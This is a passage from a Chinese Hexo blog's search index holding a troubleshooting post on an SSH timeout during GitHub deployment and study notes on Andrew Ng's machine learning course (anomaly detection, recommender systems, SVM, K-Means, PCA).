            <tag> 机器学习 </tag>
            
            <tag> 逻辑回归 </tag>
            
            <tag> 深度学习 </tag>
            
            <tag> CNN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>搭建hexo博客时，deploy出现ssh连接超时的问题</title>
      <link href="/2024/01/17/%E6%90%AD%E5%BB%BAhexo%E5%8D%9A%E5%AE%A2%E6%97%B6%EF%BC%8Cdeploy%E5%87%BA%E7%8E%B0ssh%E8%BF%9E%E6%8E%A5%E8%B6%85%E6%97%B6%E7%9A%84%E9%97%AE%E9%A2%98/"/>
      <url>/2024/01/17/%E6%90%AD%E5%BB%BAhexo%E5%8D%9A%E5%AE%A2%E6%97%B6%EF%BC%8Cdeploy%E5%87%BA%E7%8E%B0ssh%E8%BF%9E%E6%8E%A5%E8%B6%85%E6%97%B6%E7%9A%84%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h1 id="一、问题描述"><a href="#一、问题描述" class="headerlink" title="一、问题描述"></a>一、问题描述</h1><p>hexo cl和hexo g都没有问题，但是在hexo d步骤出现了：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">ssh: <span class="title">connect</span> <span class="title">to</span> <span class="title">host</span> <span class="title">github.com</span> <span class="title">port</span> 22: <span class="title">Connection</span> <span class="title">timed</span> <span class="title">out</span>  </span></span><br><span class="line"><span class="function"><span class="title">fatal</span>: <span class="title">Could</span> <span class="title">not</span> <span class="title">read</span> <span class="title">from</span> <span class="title">remote</span> <span class="title">repository</span>. <span class="title">Please</span> <span class="title">make</span> <span class="title">sure</span> <span class="title">you</span> <span class="title">have</span> <span class="title">the</span> <span class="title">correct</span> <span class="title">access</span> <span class="title">rights</span> <span class="title">and</span> <span class="title">the</span> <span class="title">repository</span> <span class="title">exists</span>.   </span></span><br><span class="line"><span class="function"><span class="title">FATAL</span>  <span class="title">Something</span>&#x27;<span class="title">s</span> <span class="title">wrong</span>. <span class="title">Maybe</span> <span class="title">you</span> <span class="title">can</span> <span class="title">find</span> <span class="title">the</span> <span class="title">solution</span> <span class="title">here</span>: <span class="title">https</span>://<span class="title">hexo.io</span>/<span class="title">docs</span>/<span class="title">troubleshooting.html</span> </span></span><br><span class="line"><span class="function"><span class="title">Error</span>: <span class="title">Spawn</span> <span class="title">failed</span></span></span><br></pre></td></tr></table></figure><h1 id="二、解决方案"><a href="#二、解决方案" class="headerlink" title="二、解决方案"></a>二、解决方案</h1><p>参考：<a href="https://blog.csdn.net/the__future/article/details/130038818">关于本地git通过ssh链接github时 time out问题的解决方法_github timeout-CSDN博客</a>)</p><p>在C:\Users\YourUserName\ .ssh目录下找到config文件，没有就新建一个<br>(其中，YourUserName是你的用户名，因人而异)</p><p>在windows中，这个config文件没有后缀，即没有指定类型，而在文件管理器中创建文件需要指定类型。有两种办法解决：</p><ol><li>我们可以复制同一目录下，类型仅为“文件”二字的其他文件，然后右键重命名为config</li><li>在平时写代码的IDE下可以直接创建没有指定类型的File(我知道IDEA可以)</li></ol><p>右键config文件，选择打开方式，选择记事本，将内建内容修改为如下：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Host github.com HostName </span><br><span class="line">ssh.github.com </span><br><span class="line">User git Port 22</span><br><span class="line">PreferredAuthentications publickey </span><br><span class="line">IdentityFile C:\Users\YourUserName\.ssh\id_rsa # 解决问题的关键</span><br></pre></td></tr></table></figure><br>与引用的文章不同，我们解决问题的关键是第五行，将IdentityFile后面的文件路径修改为自己电脑下id_rsa的路径就好了</p><p>注意：ssh默认连接22端口，如果第三行将端口号修改成了443，应该在博客文件夹主配置文件_config.yaml中在deploy下指定端口，如：<br><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">deploy:</span>  </span><br><span class="line">    <span class="attr">type:</span> <span class="string">git</span>  </span><br><span class="line">    <span class="attr">repo:</span> <span class="string">git@github.com:andreww1219/andreww1219.github.com.git</span>  </span><br><span class="line">    <span class="attr">branch:</span> <span class="string">master</span>  </span><br><span class="line">    <span class="attr">port:</span> <span class="number">443</span> <span class="comment"># 这句话指定端口</span></span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      <categories>
          
          <category> 踩坑 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ssh </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>机器学习笔记——异常检测、推荐系统、大规模机器学习、图片OCR</title>
      <link href="/2024/01/16/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94%E5%BC%82%E5%B8%B8%E6%A3%80%E6%B5%8B%E3%80%81%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E3%80%81%E5%A4%A7%E8%A7%84%E6%A8%A1%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E3%80%81%E5%9B%BE%E7%89%87OCR/"/>
      <url>/2024/01/16/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94%E5%BC%82%E5%B8%B8%E6%A3%80%E6%B5%8B%E3%80%81%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E3%80%81%E5%A4%A7%E8%A7%84%E6%A8%A1%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E3%80%81%E5%9B%BE%E7%89%87OCR/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>完结撒花！！！但是感觉只是了解了部分算法的思想，具体的实现还得找东西练一练。</p><p>该篇笔记包括：</p><ol><li>第十五章————异常检测</li><li>第十六章————推荐系统</li><li>第十七章————大规模机器学习</li><li>第十八章————图片OCR</li></ol><p>视频链接：<a href="https://www.bilibili.com/video/BV164411b7dx">[中英字幕]吴恩达机器学习系列课程</a></p><h1 id="一、异常检测-Anomaly-Detection"><a href="#一、异常检测-Anomaly-Detection" class="headerlink" title="一、异常检测(Anomaly Detection)"></a>一、异常检测(Anomaly Detection)</h1><h2 id="1-问题动机"><a href="#1-问题动机" class="headerlink" title="1. 问题动机"></a>1. 问题动机</h2><p>在<strong>正常和异常的数据集都很大</strong>的时候，我们可以使用<strong>监督学习</strong>的算法，对正常类别以及出现各种异常类别进行区分。</p><p>但是，当<strong>异常的数据集较小而且异常种类很多</strong>时，监督学习很难对异常有明确的感觉，我们更倾向于使用接下来要提到的<strong>异常检测</strong>算法。</p><h2 id="2-异常检测算法"><a href="#2-异常检测算法" class="headerlink" title="2. 异常检测算法"></a>2. 异常检测算法</h2><h3 id="2-1-数据划分"><a href="#2-1-数据划分" class="headerlink" title="2.1 数据划分"></a>2.1 数据划分</h3><p>已知数据集有较大量的正常样本，以及少量异常样本，例如：10000正常样本，20异常样本。我们将其划分为：</p><ol><li>训练集：6000正常样本</li><li>验证集：2000正常样本，10异常样本</li><li>测试集：2000正常样本，10异常样本</li></ol><h3 id="2-2-算法描述"><a href="#2-2-算法描述" class="headerlink" title="2.2 算法描述"></a>2.2 算法描述</h3><p>给定训练集$(x^{(1)}, x^{(2)}, …, x^{(m)})$，样本的每一特征都互相独立且满足正态分布，即$x_j \sim N(\mu_j, \sigma_j^2)$</p><p>得到样本每个特征的均值和方差：</p><script type="math/tex; mode=display">\mu_j = \frac{1}{m} \sum_{i=1}^m x_j^{(i)}</script><script type="math/tex; mode=display">\sigma_j^2 = \frac{1}{m} \sum_{i=1}^m (x_j^{(i)} - \mu_j)^2</script><p>给定需要预测的样本$x$，计算该样本在已有均值和方差的情况下出现的概率，也就是正常的概率为：</p><script type="math/tex; mode=display">p(x) = p(x_1; \mu_1, \sigma_1^2) \times p(x_2; \mu_2, \sigma_2^2) \times... \times p(x_n; \mu_n, \sigma_n^2) = \prod_{j=1}^n p(x_j; \mu_j, \sigma_j^2)</script><p>该式子成立的隐含条件为样本的每一个特征互相独立</p><p>我们人为设置一个边界$ \epsilon $用于判断当$p(x) &lt; \epsilon $是，$ x $为异常点</p><h3 id="2-3-优化方法"><a href="#2-3-优化方法" class="headerlink" title="2.3 优化方法"></a>2.3 优化方法</h3><ol><li><p>选择合适的$\epsilon$：使用$F_1 = 2\frac{PR}{P+R}$评估异常检测系统，其中$P$为查准率，$R$为召回率，使用交叉验证集对$ \epsilon $作选择</p></li><li><p>对不服从正态分布的特征$x$做操作如：$x \leftarrow log(x + C)$、$ x \leftarrow x^C$ ，使其近似呈正态分布</p></li><li><p>当不同特征如$x_1$和$x_2$之间有相关性时，构造特征$x_3 = f(x_1, x_2)$如$x_3 = \frac{x_1}{x_2}$来鉴别新样本中$x_1$和$x_2$之间的关系正常</p></li><li><p>人工检查预测错误的异常点，增加对应的特征</p></li></ol><h2 id="3-多元高斯分布的异常检测"><a href="#3-多元高斯分布的异常检测" class="headerlink" title="3. 多元高斯分布的异常检测"></a>3. 多元高斯分布的异常检测</h2><h3 id="3-1-算法描述"><a href="#3-1-算法描述" class="headerlink" title="3.1 算法描述"></a>3.1 算法描述</h3><p>对每一特征都满足正态分布的训练集$(x^{(1)}, x^{(2)}, …, x^{(m)})$，求多元高斯分布的均值和协方差矩阵为</p><script type="math/tex; mode=display">\mu = \frac{1}{m} \sum_{i=1}^m x^{(i)}</script><script type="math/tex; mode=display">\Sigma = \frac{1}{m} \sum_{i=1}^m (x^{(i)} - \mu)(x^{(i)} - \mu)^T</script><p>给定需要预测的样本$x$，计算该样本是正常的概率为：</p><script type="math/tex; mode=display">p(x) = \frac{1}{(2\pi)^{\frac{n}{2}} |\Sigma|^{\frac{1}{2}} } exp(-\frac{1}{2} (x - \mu)^T \Sigma^{-1} (x - \mu))</script><h3 id="3-2-与原本的模型比较"><a href="#3-2-与原本的模型比较" class="headerlink" title="3.2 与原本的模型比较"></a>3.2 与原本的模型比较</h3><ol><li>多元高斯分布能自动检测到各特征之间的相关性</li><li>多元高斯分布需要计算$n \times n$维矩阵$\Sigma$的逆，在$n$即特征数量很多时表现不好</li><li>多元高斯分布只有在$m \gt n$或者说矩阵$\Sigma$可逆时可以使用(未考究)</li></ol><h1 id="二、推荐系统-Recommender-Systems"><a href="#二、推荐系统-Recommender-Systems" class="headerlink" title="二、推荐系统(Recommender Systems)"></a>二、推荐系统(Recommender Systems)</h1><h2 id="1-问题描述"><a href="#1-问题描述" class="headerlink" title="1. 问题描述"></a>1. 问题描述</h2><p>已知用户的数量$n_u$，作品的数量$n_m$，<br>$r(i, j)$表示用户$j$对作品$i$打过分，$y^{(i,j)}$表示用户用户$j$对作品$i$打的分，可记作$n_m \times n_u$维矩阵$Y$<br>$x^{(j)}$表示作品$j$的特征，可记作$n_m \times n$维矩阵$X$，$n$为特征的数量<br>$\theta^{(i)}$表示用户的偏好，即$(\theta^{(i)})^T x^{(i)}$可以用于预测$y^{(i,j)}$，可记作$n_u \times n$维矩阵$X\Theta^1T$<br>那么$X\Theta^T$可用于预测$Y$</p><ol><li>已知<strong>用户对部分作品的打分</strong>和<strong>作品的的特征</strong>，求<strong>用户的偏好</strong>，预测用户对其他作品的打分</li><li>已知<strong>用户对部分作品的打分</strong>和<strong>用户的偏好</strong>，推断<strong>作品的特征</strong></li></ol><h2 id="2-基于内容的推荐算法"><a href="#2-基于内容的推荐算法" class="headerlink" title="2. 基于内容的推荐算法"></a>2. 基于内容的推荐算法</h2><p>基于内容的推荐算法，适用的问题是：<br>已知<strong>用户对部分作品的打分</strong>和<strong>作品的的特征</strong>，求<strong>用户的偏好</strong>，预测用户对其他作品的打分</p><p>基于内容的推荐算法本质是梯度下降求解线性回归的问题，优化目标为</p><p>对于每个用户$j$，找到$\theta^{(j)}$，最小化损失函数如下</p><script type="math/tex; mode=display">J(\theta^{(j)}) = \frac{1}{2} \sum_{i: r(i, j) = 1} ((\theta^{(j)})^T x^{(i)} - y^{(i, j)})^2 + \frac{\lambda}{2} \sum_{k=1}^{n}( \theta_k^{(j)} )^2</script><p>由于每个用户之间互不相关，可以对每个用户的优化目标的加和作为总的优化目标，即最小化</p><script type="math/tex; mode=display">J(\theta^{(1)}, ..., \theta^{(n_u)}) = \frac{1}{2} \sum_{j=1}^{n_u} \sum_{i: r(i, j) = 1} ((\theta^{(j)})^T x^{(i)} - y^{(i, j)})^2 + \frac{\lambda}{2} \sum_{j=1}^{n_u} \sum_{k=1}^{n}( \theta_k^{(j)} )^2</script><p>得到梯度下降的迭代式如下：</p><script type="math/tex; mode=display">\theta_k^{(j)} = \theta_k^{(j)} - \alpha \sum_{i: r(i, j) = 1} (\theta^{(j)})^T x^{(i)} - y^{(i, j)})x_k^{(i)} when \space k = 0</script><script type="math/tex; mode=display">\theta_k^{(j)} = \theta_k^{(j)} - \alpha ( \sum_{i: r(i, j) = 1} (\theta^{(j)})^T x^{(i)} - y^{(i, j)})x_k^{(i)} + \lambda \theta_k^{(j)})when \space k \ne 0</script><h2 id="3-协同过滤"><a href="#3-协同过滤" class="headerlink" title="3. 协同过滤"></a>3. 协同过滤</h2><p>同理可得，已知<strong>用户对部分作品的打分</strong>和<strong>用户的偏好</strong>，推断<strong>作品的特征</strong>可以转化为：</p><p>对于每个作品$i$，找到$x^{(i)}$，最小化损失函数如下：</p><script type="math/tex; mode=display">J(x^{(i)}) = \frac{1}{2} \sum_{j: r(i, j) = 1} ((\theta^{(j)})^T x^{(i)} - y^{(i, j)})^2 + \frac{\lambda}{2} \sum_{k=1}^{n}( x_k^{(i)} )^2</script><p>同理可得总的优化目标为最小化</p><script type="math/tex; mode=display">J(x^{(1)}, ..., x^{(n_m)}) = \frac{1}{2} \sum_{i=1}^{n_m} \sum_{j: r(i, j) = 1} ((\theta^{(j)})^T x^{(i)} - y^{(i, j)})^2 + \frac{\lambda}{2} \sum_{i=1}^{n_m} \sum_{k=1}^{n}( x_k^{(i)} )^2</script><p>与基于内容的推荐算法相结合，可以在随机初始化$\Theta$或$X$的情况下，对它们依次作梯度下降，比如：</p><script type="math/tex; mode=display">\Theta \rightarrow X \rightarrow \Theta \rightarrow X \rightarrow \Theta \cdots</script><p>或者，抽象出它们共同的优化目标，即最小化以下损失函数：</p><script type="math/tex; mode=display">J(\theta^{(1)}, ..., \theta^{(n_u)}, x^{(1)}, ..., x^{(n_m)}) = \frac{1}{2}  \sum_{(i, j): r(i, j) = 1} ((\theta^{(j)})^T x^{(i)} - y^{(i, j)})^2 + \frac{\lambda}{2} \sum_{j=1}^{n_u} \sum_{k=1}^{n}( \theta_k^{(j)} )^2  + \frac{\lambda}{2} \sum_{i=1}^{n_m} \sum_{k=1}^{n}( x_k^{(i)} )^2</script><p>在<strong>仅有用户对部分作品打分</strong>的情况下，同时求解$\Theta$和$X$，其梯度下降的迭代式为</p><script type="math/tex; mode=display">x_k^{(i)} = x_k^{(i)} - \alpha ( \sum_{j: r(i, j) = 1} (\theta^{(j)})^T x^{(i)} - y^{(i, j)})\theta_k^{(j)} + \lambda x_k^{(i)})</script><script type="math/tex; mode=display">\theta_k^{(j)} = \theta_k^{(j)} - \alpha ( \sum_{i: r(i, j) = 1} (\theta^{(j)})^T x^{(i)} - y^{(i, j)})x_k^{(i)} + \lambda \theta_k^{(j)})</script><h2 id="4-实现细节"><a href="#4-实现细节" class="headerlink" title="4. 实现细节"></a>4. 实现细节</h2><ol><li>对矩阵$Y$作均值化，可以使模型对未曾打分的用户的预测有意义</li><li>可以用$|x^{(i)} - x^{(j)}|$表示两个作品的相似程度</li></ol><h1 id="三、大规模机器学习-Large-Scale-Machine-Learning"><a href="#三、大规模机器学习-Large-Scale-Machine-Learning" class="headerlink" title="三、大规模机器学习(Large Scale Machine Learning)"></a>三、大规模机器学习(Large Scale Machine Learning)</h1><h2 id="1-随机梯度下降、Min-Batch梯度下降和在线学习"><a href="#1-随机梯度下降、Min-Batch梯度下降和在线学习" class="headerlink" title="1. 随机梯度下降、Min-Batch梯度下降和在线学习"></a>1. 随机梯度下降、Min-Batch梯度下降和在线学习</h2><p>不同于原本的批量梯度下降(Batch Gradient Descend)每次迭代需要遍历并减去每个样本的偏导数的加和，随机梯度下降(Stochastic Gradient Descend, or SGD)的步骤为：</p><ol><li>打乱数据的顺序</li><li>遍历样本，每次迭代只减去一个样本的偏导数</li><li>重复以上步骤直到模型收敛</li></ol><p>注意：随机梯度下降只能使模型在最优解周围徘徊</p><p>Min-Batch梯度下降介于Batch梯度下降和随机梯度下降之间，需要选择每轮迭代使用的样本数$b$，步骤为：</p><ol><li>遍历样本，每次迭代减去$b$个样本求偏导数的加和</li><li>重复以上步骤直到模型收敛</li></ol><p>在线学习(Online Learning)应用在有不断涌入的用户流和数据流的情况，直接对每个用户提供的数据作拟合</p><h2 id="2-优化技巧"><a href="#2-优化技巧" class="headerlink" title="2. 优化技巧"></a>2. 优化技巧</h2><ol><li>画出学习曲线，预先检查模型是否是低偏差，是否能在大数据集的情况下被优化</li><li>设定随机梯度下降的学习率$\alpha = \frac{const_1}{iterationsCounts + cosnt_2}$，在迭代次数增加时，学习率下降，模型会收敛到最优解</li><li>Map-reduce：将数据分散到多个计算机或者内核去并行处理，最后汇总到中心服务器。</li></ol><h1 id="四、图片OCR-Photo-Optical-Character-Recognition"><a href="#四、图片OCR-Photo-Optical-Character-Recognition" class="headerlink" title="四、图片OCR(Photo Optical Character Recognition)"></a>四、图片OCR(Photo Optical Character Recognition)</h1><p>从Photo OCR去看设计复杂的机器学习系统的一些理念</p><ol><li>将一个复杂的机器学习系统分解为流水线上多个机器学习模块。例如，将图片OCR分解为：文本检测、字符分割、字符识别。滑动窗口+监督学习实现文本检测，监督学习完成字符分割和字符识别</li><li>人工数据：人工合成全新的数据 或者 在已有的数据上添加噪声</li><li>上限分析(Ceiling Analysis)：人为提高某个模块的准确率，观察其对整个系统的准确率的影响，评估出最值得优化的一个模块</li></ol>]]></content>
      
      
      <categories>
          
          <category> 人工智能 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 机器学习 </tag>
            
            <tag> 梯度下降 </tag>
            
            <tag> 异常检测 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>机器学习笔记——机器学习系统设计、支持向量机(SVM)、K-Means算法、主成分分析法(PCA)</title>
      <link href="/2024/01/15/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E3%80%81%E6%94%AF%E6%8C%81%E5%90%91%E9%87%8F%E6%9C%BA(SVM)%E3%80%81K-Means%E7%AE%97%E6%B3%95%E3%80%81%E4%B8%BB%E6%88%90%E5%88%86%E5%88%86%E6%9E%90%E6%B3%95(PCA)/"/>
      <url>/2024/01/15/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E3%80%81%E6%94%AF%E6%8C%81%E5%90%91%E9%87%8F%E6%9C%BA(SVM)%E3%80%81K-Means%E7%AE%97%E6%B3%95%E3%80%81%E4%B8%BB%E6%88%90%E5%88%86%E5%88%86%E6%9E%90%E6%B3%95(PCA)/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这两天刷了四章视频，再来复盘一下：</p><ol><li>第十一章————机器学习系统设计</li><li>第十二章————支持向量机</li><li>第十三章————K-Means算法</li><li>第十四章————主成分分析法</li></ol><p>视频链接：<a href="https://www.bilibili.com/video/BV164411b7dx">[中英字幕]吴恩达机器学习系列课程</a></p><h1 id="一、机器学习系统设计"><a href="#一、机器学习系统设计" class="headerlink" title="一、机器学习系统设计"></a>一、机器学习系统设计</h1><ol><li>快速构建一个较为简单的模型，然后对模型进行验证，再决定下一步应该怎么优化，而不是过早地去优化。</li><li>在引入新的想法时，可对有无引入该想法地不同模型作验证，由<strong>单一指标</strong>确定引入新想法是否有效</li><li>在对偏斜类（或者 不对称类）作误差评估时，应该考虑到<strong>查准率</strong>(Percision, or P)和<strong>召回率</strong>(Recall, or R)，定义$F = 2\frac{PR}{P+R}$，通过比较$F$值选择模型保证两者处于较高的水平</li><li>在模型低偏差的情况下，增大数据集保证低方差，能有效提高模型效能。</li></ol><h1 id="二、支持向量机-Support-Vector-Machine-or-SVM"><a href="#二、支持向量机-Support-Vector-Machine-or-SVM" class="headerlink" title="二、支持向量机(Support Vector Machine, or SVM)"></a>二、支持向量机(Support Vector Machine, or SVM)</h1><h2 id="1-逻辑回归的局限性"><a href="#1-逻辑回归的局限性" class="headerlink" title="1. 逻辑回归的局限性"></a>1. 逻辑回归的局限性</h2><p>在分类问题中，当两个类别之间间隔较大时，我们能够得到许多不同的决策边界将其正确划分。但是不同的决策边界之间也有优劣性：<br>当决策边界与样本点相隔很近时，新的样本稍微有点不同就可能导致模型对其错误分类，也就是模型的<strong>泛化性</strong>不强。</p><p>因此，我们的优化目标就是找到一个最优决策边界，使得<strong>样本点到决策边界的间隔最大</strong>。</p><p><strong>为什么逻辑回归不能得到最优决策边界</strong></p><p>我们知道逻辑回归的损失函数为</p><script type="math/tex; mode=display">J(\theta) = -\frac{1}{m} \sum_{i=1}^m y_i\ln h_\theta(x^{(i)}) + (1-y_i)\ln (1-h_\theta(x^{(i)})) + \lambda \sum_{j=1}^n \theta_j^2</script><p>当模型已经能够正确分类时，前一项几乎为0，我们的的优化目标就是最小化后一项，即最小化$\lambda \sum_{j=1}^n \theta_j^2 = \lambda | \theta |^2$</p><p>在逻辑回归中，决策边界为$\theta^T x = 0$，那么$\theta = (\theta_0, \theta_1, …, \theta_n)$为决策边界的法向量。</p><blockquote><p>二维的例子就是，当$\theta = (0, A, B)$，决策边界为直线$Ax + By = 0$时，直线方向向量$l = (-B, A)$与向量$\theta$互相垂直。</p></blockquote><p>那么样本点到决策边界的间隔可表示为向量$x$在向量$\theta$上的投影的绝对值，记投影</p><script type="math/tex; mode=display">p = \| x\| cos<\theta, x></script><p>其中$cos&lt;\theta, x&gt;$为向量$\theta$和向量$x$之间夹角的cos值。</p><p>决策边界的两边分别满足，$\theta^T x \ge 0$和$\theta^T x \lt 0$，又$\theta^T x = | \theta | | x| cos&lt;\theta, x&gt;$，得到</p><p>$ | \theta |  p\ge 0$ 和 $ | \theta |  p \lt 0$</p><p>这是$p$和$|\theta|$之间的限定关系，可知$p$的变化对$|\theta|$的减少没有什么帮助，于是逻辑回归自然就不会选择$p$更大的结果，也就是不会选择最优决策边界。</p><h2 id="2-SVM的引入"><a href="#2-SVM的引入" class="headerlink" title="2. SVM的引入"></a>2. SVM的引入</h2><p>由1可知，如果改变$p$和$|\theta|$之间的限定关系为</p><p>$ | \theta |  p\ge 1$ 和 $ | \theta |  p \lt -1$</p><p>为了使$|\theta|$减小，模型就会自动地去使$p$的绝对值增大，即选择最优决策边界。</p><p>为了实现这一目标，我们需要在原先的逻辑回归上做些手脚，修改损失函数为：</p><script type="math/tex; mode=display">J(\theta) = C\sum_{i=1}^m [y^{(i)} cost_1(\theta^T x^{(i)}) + (1-y^{(i)})cost_0(\theta^T x^{(i)}] + \frac{1}{2} \sum_{j=1}^n \theta_j^2</script><p>其中，</p><p>$cost_1(\theta^T x^{(i)}) 与 -\ln h_\theta(x^{(i)})$相似，但是在自变量$z$属于$(1,+\infty)$时，$cost_1(z)$的值为0</p><p>$cost_0(\theta^T x^{(i)}) 与 -\ln (1-h_\theta(x^{(i)}))$相似，但是在自变量$z$属于$(-\infty, -1)$时，$cost_0(z)$的值为0</p><p>也就是说，当$y = 1$时，我们希望$\theta^T x^{(i)} &gt;= 1$，当$y = 0$时，我们希望$\theta^T x^{(i)} &lt; -1$</p><p>这就是SVM之所以被叫做大间隔分类器的数学原理</p><h2 id="3-核函数-Kernel-Function"><a href="#3-核函数-Kernel-Function" class="headerlink" title="3. 核函数(Kernel Function)"></a>3. 核函数(Kernel Function)</h2><p>参考文献：<a href="https://zhuanlan.zhihu.com/p/261061617">详解SVM模型——核函数是怎么回事 - 知乎 (zhihu.com)</a></p><p>在实际问题中，我们在已有的维度无法找到一个线性的边界将两个类别划分开。所以我们需要通过一个映射关系，将低维的数据映射到高维，再从高维找到一个超平面将不同类别的样本划分。</p><p>所以核函数就是为了得到非线性决策边界，<strong>实现低维到高维映射关系</strong>且<strong>不增加运算的复杂度</strong>的函数。也有译作Kernel Trick，所有核函数本质是一种运算技巧。</p><p>一个使用频率很高的核函数是高斯核：<script type="math/tex">similarity(x_i, x_j) = exp(- \frac{\|x_i - x_j\|^2}{2\sigma^2})</script></p><p>由于SVM的数学性质(未考究)，把核函数与SVM结合在一起的表现特别出色。</p><p>例如，将高斯核与SVM相结合：</p><p>定义特征$f = (f_1, f_2, …, f_m)^T$取代损失函数中的$x$，其中$f_j = similarity(x, l^{(j)})$，$l^{(j)}$为样本中的某一点，那么有</p><script type="math/tex; mode=display">J(\theta) = C\sum_{i=1}^m [y^{(i)} cost_1(\theta^T f^{(i)}) + (1-y^{(i)})cost_0(\theta^T f^{(i)}] + \frac{1}{2} \sum_{j=1}^n \theta_j^2</script><blockquote><p>呜呜写不下去了，不知道SVM是怎么求解的</p></blockquote><h1 id="三、K-Means算法"><a href="#三、K-Means算法" class="headerlink" title="三、K-Means算法"></a>三、K-Means算法</h1><h2 id="1-问题描述"><a href="#1-问题描述" class="headerlink" title="1. 问题描述"></a>1. 问题描述</h2><p>已知我们要将没有标签的数据分为$K$类，要怎么分才最合理？</p><p>设每个$c^{i}$为样本点$x^{(i)}$被分配到的聚类的下标<br>每个聚类中心的坐标为$\mu_k$<br>则$\mu_{c^{(i)}}$为样本点$x^{(i)}$被分配到的聚类的坐标</p><p>我们可以用<strong>样本点到其分配到的聚类中心的距离</strong>作为衡量分类合理性的标准，将问题转化为</p><p>如何最小化损失函数$J(c^{(1)}, …, c^{(m)}, \mu_1, …, \mu_K) = \frac{1}{m} \sum_{i=1}^m | x^{(i)} - \mu_{c^{(i)}}|^2$</p><p>我们也将它叫作失真代价函数(Cost Distortion)</p><h2 id="2-迭代过程"><a href="#2-迭代过程" class="headerlink" title="2. 迭代过程"></a>2. 迭代过程</h2><ol><li>修改每一个$c^{(i)}$为离x$^{(i)}$最近的聚类中心的下标，$1\le i \le m$</li><li>修改每一个$\mu_k$为聚类$k$中所有点的均值，$1\le k \le K$</li><li>重复以上两个步骤直到聚类中心不变</li></ol><h2 id="3-优化方法"><a href="#3-优化方法" class="headerlink" title="3. 优化方法"></a>3. 优化方法</h2><h3 id="3-1-随机初始化"><a href="#3-1-随机初始化" class="headerlink" title="3.1 随机初始化"></a>3.1 随机初始化</h3><p>不同的初始化结果会导致不同的聚类结果，我们可以选择其中损失函数最小的值作为最终的结果:  </p><p>进行一定次数：随机初始化聚类中心为$m$个点中的任意$k$点</p><ol><li>修改每一个$c^{(i)}$为离x$^{(i)}$最近的聚类中心的下标，$1\le i \le m$ </li><li>修改每一个$\mu_k$为聚类$k$中所有点的均值，$1\le k \le K$ </li><li>重复1、2步骤直到聚类中心不变 </li><li>计算$J(c^{(1)}, …, c^{(m)}, \mu_1, …, \mu_K) = \frac{1}{m} \sum_{i=1}^m | x^{(i)} - \mu_{c^{(i)}}|^2$</li></ol><p>从中找出$J$值最小的情况作为结果</p><h3 id="3-2-选择聚类数量"><a href="#3-2-选择聚类数量" class="headerlink" title="3.2 选择聚类数量"></a>3.2 选择聚类数量</h3><ol><li>手肘法: 画出聚类数量K与失真代价函数J的关系曲线，选择开始变平缓的第一个点</li><li>当手肘发不管用时，根据实际业务需求选择K的值</li></ol><h1 id="四、主成分分析法-Priciple-Component-Analysis-or-PCA"><a href="#四、主成分分析法-Priciple-Component-Analysis-or-PCA" class="headerlink" title="四、主成分分析法(Priciple Component Analysis, or PCA)"></a>四、主成分分析法(Priciple Component Analysis, or PCA)</h1><h2 id="1-问题描述-1"><a href="#1-问题描述-1" class="headerlink" title="1. 问题描述"></a>1. 问题描述</h2><p>在使用原始数据需要的内存和计算量过于庞大以至于模型工作效率低的情况下，我们考虑对高维的数据$x^{(i)}$压缩为低维$z^{(i)}$：过$x^{(i)}$作一低维的超平面，将$x^{(i)}$投影到超平面上得到对应$z^{(i)}$。</p><p>对数据压缩应该尽可能保留原来的信息，$x^{(i)}$距超平面的距离越远将丢失越多的信息。将均值点与$x^{(i)}$连线，为使$x^{(i)}$距超平面的距离减小，那么$x^{(i)}$到超平面的垂足到均值点的距离应该更大，也就是要保证投影后的数据<strong>方差</strong>更大。</p><p>于是我们的优化目标为：找到一个新的坐标系，使得在新坐标系下数据的<strong>方差最大</strong>，为了减少数据的冗余，我们希望数据在每个方向上都是不相关的，也就是<strong>协方差为零</strong>。</p><h2 id="2-数据压缩"><a href="#2-数据压缩" class="headerlink" title="2. 数据压缩"></a>2. 数据压缩</h2><h3 id="2-1-数据预处理"><a href="#2-1-数据预处理" class="headerlink" title="2.1 数据预处理"></a>2.1 数据预处理</h3><ol><li>为了方便求协方差矩阵，我们将所有数据减去其均值</li><li>由于我们是用方差度量优化结果，为了防止方差较大的特征主导度量结果，应该做特征缩放。</li></ol><h3 id="2-2-PCA算法"><a href="#2-2-PCA算法" class="headerlink" title="2.2 